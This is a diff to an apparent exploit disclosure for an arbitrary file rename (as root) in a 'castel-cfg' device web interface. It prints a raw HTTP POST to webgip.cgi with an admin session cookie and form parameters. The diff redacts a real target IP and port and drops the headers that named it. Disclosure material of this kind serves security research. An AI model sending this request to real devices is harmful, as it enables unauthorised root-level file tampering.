@@ -64,7 +64,7 @@ CONTENT
 #Aritrary File Rename (As Root) 
 
 POST /castel-cfg/cgi-bin/webgip.cgi HTTP/1.1
-Host: 91.211.66.10:5443
+Host: XX:X
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Language: en-GB,en;q=0.5
@@ -72,10 +72,8 @@ Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 Content-Length: 588
-Origin: https://91.211.66.10:5443
 DNT: 1
 Connection: close
-Referer: https://91.211.66.10:5443/castel-cfg/gip2.html
 Cookie: SessId=1613569922; UserLogin=admin; user_lang=en
 
 protocol=2&page=35&mode=21&lang=en&bt=54&gid=&fichier_a_envoyer_type=&fichier_a_telecharger_supprimer_type=&fichier_a_envoyer_selection=
